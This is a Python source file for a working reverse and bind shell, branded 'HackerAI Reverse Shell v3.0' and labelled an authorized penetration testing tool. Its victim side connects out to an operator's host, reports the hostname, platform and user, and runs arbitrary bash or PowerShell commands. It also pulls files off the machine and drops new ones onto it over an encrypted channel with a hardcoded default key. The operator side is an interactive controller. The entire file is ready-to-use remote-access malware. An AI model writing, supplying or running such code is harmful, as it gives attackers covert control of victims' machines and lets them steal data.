#!/usr/bin/env python3
"""
REVERSHELL — Authorized Penetration Testing Tool
Usage:
  Victim (reverse):   python3 shell.py LHOST=10.0.0.1 LPORT=4444
  Victim (bind):      python3 shell.py LPORT=4444 --bind
  Listener (reverse): python3 shell.py --listen LPORT=4444
  Listener (bind):    python3 shell.py --listen LHOST=10.0.0.1 LPORT=4444 --bind
"""

import argparse, base64, codecs, json, os, platform, re, shlex, shutil, signal
import socket, sqlite3, subprocess, sys, threading, time, uuid, zipfile
from datetime import datetime
from pathlib import Path

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAIL = True
except ImportError:
    CRYPTO_AVAIL = False
    print("[!] 'cryptography' not installed — falling back to XOR-only obfuscation")
    print("    pip install cryptography   (recommended for production use)")


#                                              
#  Simple XOR + Fernet encryption layer
#                                              
class Crypt:
    def __init__(self, key: bytes = None):
        if key is None:
            key = b'H4ck3rA1_S3cr3tK3y_2026!!'
        self.key = key[:32].ljust(32, b'\x00')
        if CRYPTO_AVAIL:
            self.fernet = Fernet(base64.urlsafe_b64encode(self.key))
        else:
            self.fernet = None

    def encrypt(self, data: bytes) -> bytes:
        if self.fernet:
            return self.fernet.encrypt(data)
        # fallback XOR
        xored = bytes([b ^ self.key[i % len(self.key)] for i, b in enumerate(data)])
        return base64.b64encode(xored)

    def decrypt(self, data: bytes) -> bytes:
        if self.fernet:
            return self.fernet.decrypt(data)
        xored = base64.b64decode(data)
        return bytes([b ^ self.key[i % len(self.key)] for i, b in enumerate(xored)])


#                                              
#  Shell session handler
#                                              
class ShellSession:
    """Full interactive shell with command history and file transfer"""
    def __init__(self, sock: socket.socket, crypt: Crypt, bind_mode: bool = False):
        self.sock = sock
        self.crypt = crypt
        self.bind_mode = bind_mode
        self.cwd = Path.cwd()
        self.history = []
        self._alive = True

    def send(self, msg: str):
        payload = json.dumps({"type": "msg", "data": msg, "cwd": str(self.cwd)}).encode()
        self.sock.send(self.crypt.encrypt(payload) + b'\n')

    def recv(self) -> dict:
        buf = b''
        while b'\n' not in buf:
            chunk = self.sock.recv(65536)
            if not chunk:
                self._alive = False
                raise ConnectionError("Connection closed")
            buf += chunk
        line, _ = buf.split(b'\n', 1)
        dec = self.crypt.decrypt(line)
        return json.loads(dec.decode())

    def run(self):
        """Main loop — read commands, execute, respond"""
        system_info = {
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "user": os.environ.get("USER") or os.environ.get("USERNAME", "unknown"),
            "cwd": str(self.cwd),
        }
        self.send(f"[+] Connected  |  {json.dumps(system_info)}")

        while self._alive:
            try:
                msg = self.recv()
            except (ConnectionError, json.JSONDecodeError):
                break

            cmd_type = msg.get("type", "cmd")
            data = msg.get("data", "").strip()

            if cmd_type == "exit":
                self.send("[+] Goodbye.")
                break

            if cmd_type == "cd":
                self._cd(data)
                continue

            if cmd_type == "download":
                self._download(data)
                continue

            if cmd_type == "upload":
                self._upload(data)
                continue

            # Default: shell command execution
            self._exec_cmd(data)

    def _cd(self, target: str):
        target = target.strip() or "~"
        try:
            p = Path(target).expanduser().resolve()
            os.chdir(p)
            self.cwd = p
            self.send(f"[OK] cd -> {self.cwd}")
        except Exception as e:
            self.send(f"[ERR] cd: {e}")

    def _exec_cmd(self, cmd: str):
        if not cmd:
            self.send("")
            return
        self.history.append(cmd)
        try:
            # Use PowerShell on Windows for better compatibility
            if os.name == "nt":
                proc = subprocess.run(
                    ["powershell", "-Command", cmd],
                    capture_output=True, text=True, timeout=30
                )
            else:
                proc = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True, timeout=30,
                    executable="/bin/bash"
                )
            out = proc.stdout + proc.stderr
            self.send(out if out else "[OK] Command completed (no output)")
        except subprocess.TimeoutExpired:
            self.send("[ERR] Command timed out (30s)")
        except Exception as e:
            self.send(f"[ERR] {e}")

    def _download(self, path: str):
        p = Path(path).expanduser()
        if not p.is_file():
            self.send(f"[ERR] Not a file: {p}")
            return
        try:
            data = p.read_bytes()
            b64 = base64.b64encode(data).decode()
            self.send(f"[FILE] {p.name} ({len(data)} bytes)")
            # Send in chunks
            for i in range(0, len(b64), 4096):
                chunk = b64[i:i+4096]
                self.sock.send(self.crypt.encrypt(json.dumps({"type": "file_chunk", "data": chunk}).encode()) + b'\n')
            self.sock.send(self.crypt.encrypt(json.dumps({"type": "file_end", "data": ""}).encode()) + b'\n')
        except Exception as e:
            self.send(f"[ERR] Download failed: {e}")

    def _upload(self, meta: str):
        # Expect JSON: {"name": "...", "size": N}
        try:
            info = json.loads(meta)
        except json.JSONDecodeError:
            self.send("[ERR] Upload meta must be JSON with 'name' and 'size'")
            return
        self.send("[UPLOAD] Ready")
        received = 0
        chunks = []
        while received < info["size"]:
            msg = self.recv()
            if msg.get("type") == "file_end":
                break
            chunks.append(msg.get("data", ""))
            received += len(msg.get("data", ""))
        raw = base64.b64decode("".join(chunks))
        dst = Path(info["name"]).expanduser()
        dst.write_bytes(raw)
        self.send(f"[OK] Uploaded {dst} ({len(raw)} bytes)")


#                                              
#  Socket helpers
#                                              
def create_listener(host: str, port: int, bind_mode: bool = False) -> socket.socket:
    """Start a listener — either bind-style or reverse-style"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(5)
    print(f"[*] Listening on {host}:{port}")
    client, addr = s.accept()
    print(f"[+] Connection from {addr}")
    return client


def connect_target(host: str, port: int) -> socket.socket:
    """Connect out to a listener"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect((host, port))
    print(f"[+] Connected to {host}:{port}")
    return s


#                                              
#  Interactive controller (listener side)
#                                              
class Controller:
    """Interactive menu for the operator"""
    def __init__(self, sock: socket.socket, crypt: Crypt):
        self.sock = sock
        self.crypt = crypt
        self.banner = """
                                        
    HackerAI Reverse Shell v3.0         
    Commands:                           
      cmd <shell cmd>                   
      cd <path>                         
      download <remote_path>            
      upload <local_path>               
      exit / quit                       
      help                              
                                        """

    def send_cmd(self, cmd_type: str, data: str):
        payload = json.dumps({"type": cmd_type, "data": data}).encode()
        self.sock.send(self.crypt.encrypt(payload) + b'\n')

    def recv_response(self) -> str:
        buf = b''
        while b'\n' not in buf:
            chunk = self.sock.recv(65536)
            if not chunk:
                return None
            buf += chunk
        line, _ = buf.split(b'\n', 1)
        dec = self.crypt.decrypt(line)
        msg = json.loads(dec.decode())
        return msg.get("data", "")

    def interactive(self):
        print(self.banner)
        # Print the initial system info
        initial = self.recv_response()
        if initial:
            print(f"[remote] {initial}")

        while True:
            try:
                raw = input("shell> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                self.send_cmd("exit", "")
                break

            if not raw:
                continue

            if raw.lower() in ("exit", "quit"):
                self.send_cmd("exit", "")
                break

            if raw.lower() == "help":
                print(self.banner)
                continue

            # Parse command prefix
            parts = shlex.split(raw)
            cmd_type = "cmd"
            data = raw

            if parts[0].lower() == "cd":
                cmd_type = "cd"
                data = " ".join(parts[1:]) if len(parts) > 1 else "~"
            elif parts[0].lower() == "download":
                cmd_type = "download"
                data = " ".join(parts[1:]) if len(parts) > 1 else ""
            elif parts[0].lower() == "upload":
                cmd_type = "upload"
                local_path = parts[1] if len(parts) > 1 else ""
                if not local_path:
                    print("[!] Usage: upload <local_file>")
                    continue
                lp = Path(local_path).expanduser()
                if not lp.is_file():
                    print(f"[!] Local file not found: {lp}")
                    continue
                meta = json.dumps({"name": lp.name, "size": lp.stat().st_size})
                self.send_cmd("upload", meta)
                resp = self.recv_response()
                print(f"[remote] {resp}")
                # Send file chunks
                data_b64 = base64.b64encode(lp.read_bytes()).decode()
                for i in range(0, len(data_b64), 4096):
                    chunk = data_b64[i:i+4096]
                    enc = self.crypt.encrypt(json.dumps({"type": "file_chunk", "data": chunk}).encode())
                    self.sock.send(enc + b'\n')
                enc_end = self.crypt.encrypt(json.dumps({"type": "file_end", "data": ""}).encode())
                self.sock.send(enc_end + b'\n')
                final = self.recv_response()
                print(f"[remote] {final}")
                continue

            self.send_cmd(cmd_type, data)
            resp = self.recv_response()
            if resp is None:
                print("[!] Connection lost")
                break
            print(resp)


#                                              
#  Entry point
#                                              
def main():
    parser = argparse.ArgumentParser(description="HackerAI Reverse/Bind Shell")
    parser.add_argument("--lhost", help="Listen or connect host", default="0.0.0.0")
    parser.add_argument("--lport", help="Listen or connect port", type=int, default=4444)
    parser.add_argument("--listen", action="store_true", help="Start in listener mode")
    parser.add_argument("--bind", action="store_true", help="Use bind mode (victim listens)")
    parser.add_argument("--key", help="Encryption key (16+ bytes, hex)", default=None)
    args = parser.parse_args()

    # Override with positional-style args: LHOST=... LPORT=...
    for arg in sys.argv[1:]:
        if arg.upper().startswith("LHOST="):
            args.lhost = arg.split("=", 1)[1]
        elif arg.upper().startswith("LPORT="):
            args.lport = int(arg.split("=", 1)[1])

    key = bytes.fromhex(args.key) if args.key else None
    crypt = Crypt(key)

    #    LISTENER MODE   
    if args.listen:
        if args.bind:
            # Bind listener: wait for controller to connect
            sock = create_listener(args.lhost, args.lport, bind_mode=True)
            ctrl = Controller(sock, crypt)
            ctrl.interactive()
        else:
            # Reverse listener: wait for victim to connect
            sock = create_listener(args.lhost, args.lport)
            ctrl = Controller(sock, crypt)
            ctrl.interactive()
        sock.close()
        return

    #    VICTIM / AGENT MODE   
    if args.bind:
        # Bind: victim listens, controller connects
        sock = create_listener(args.lhost, args.lport, bind_mode=True)
        session = ShellSession(sock, crypt, bind_mode=True)
        session.run()
    else:
        # Reverse: victim connects out to controller
        sock = connect_target(args.lhost, args.lport)
        session = ShellSession(sock, crypt)
        session.run()


if __name__ == "__main__":
    main()
